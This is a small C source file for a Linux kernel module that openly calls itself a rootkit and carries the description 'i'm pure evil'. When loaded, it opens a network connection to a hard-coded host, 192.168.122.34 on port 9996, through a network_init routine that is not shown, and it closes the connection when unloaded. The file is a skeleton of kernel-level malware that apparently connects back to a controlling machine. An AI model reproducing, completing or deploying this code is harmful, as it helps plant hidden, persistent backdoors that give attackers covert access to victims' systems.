#include <linux/module.h>
#include "network.h"

static __init int rootkit_init(void) {
  pr_info("rootkit: Hello World!\n");
  if ((network_init("192.168.122.34", 9996)) != 0) {
  /* if ((network_init("127.0.0.1", 6667)) != 0) { */
    pr_warning("rootkit: could not initialize connection. exiting.");
  }
  return 0;
}

static __exit void rootkit_exit(void) { 
  network_exit();
  pr_info("rootkit: Goodbye.\n"); }

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("i'm pure evil");
MODULE_AUTHOR("Naim Chefirat");
